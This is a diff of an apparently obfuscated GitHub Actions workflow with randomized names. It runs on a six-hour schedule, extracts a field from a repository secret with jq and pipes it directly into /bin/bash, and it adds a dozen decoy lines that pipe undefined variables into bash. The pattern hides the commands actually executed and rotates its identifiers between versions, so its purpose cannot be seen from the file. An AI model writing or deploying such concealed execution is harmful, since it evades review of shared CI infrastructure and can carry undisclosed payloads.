@@ -1,31 +1,28 @@
 name: qiqaindyh
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 2/6 * * *'
-jobs:  # 21558
+    - cron: '14 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: qiqaindyh
         env:
-          z154: ${{ secrets.z154 }}
+          af0: ${{ secrets.af0 }}
         run: |
-          echo $z154 | jq -r .l6 | /bin/bash
-          echo $bvpxy01517 | jq -r .qefzt1133 | /bin/bash
-          echo $zavn0 | jq -r .uihs2653 | /bin/bash
-          echo $gmxi58220 | jq -r .lqy44 | /bin/bash
-          echo $ovg128 | jq -r .vrk0103 | /bin/bash
-          echo $p6 | jq -r .ghr4055 | /bin/bash
-          echo $icmey2609 | jq -r .r395 | /bin/bash
-          echo $rv0 | jq -r .k846 | /bin/bash
-          echo $kshjz08486 | jq -r .w4 | /bin/bash
-          echo $ub814 | jq -r .figpa5113 | /bin/bash
-          echo $dtory658 | jq -r .dxqyk7174 | /bin/bash
-          echo $eolc0 | jq -r .ns52975 | /bin/bash
-          echo $kt681 | jq -r .ogt634 | /bin/bash
-          echo $vu02720 | jq -r .jfj5052 | /bin/bash
-          echo $oq4 | jq -r .fqbkn16709 | /bin/bash
-          echo $bqe2837 | jq -r .q153 | /bin/bash
+          echo $af0 | jq -r .p9 | /bin/bash
+          echo $q4367 | jq -r .sq38523 | /bin/bash
+          echo $hfnh27 | jq -r .yk399 | /bin/bash
+          echo $bojsc43348 | jq -r .yk0842 | /bin/bash
+          echo $dooa76441 | jq -r .otjvw39424 | /bin/bash
+          echo $pca7 | jq -r .qj0 | /bin/bash
+          echo $wisvf186 | jq -r .jkyqh2978 | /bin/bash
+          echo $gznz8147 | jq -r .xkamu42 | /bin/bash
+          echo $qtmu720 | jq -r .z406 | /bin/bash
+          echo $aes00 | jq -r .onuf29 | /bin/bash
+          echo $jhfw95 | jq -r .l2 | /bin/bash
+          echo $c52292 | jq -r .myj8722 | /bin/bash
 
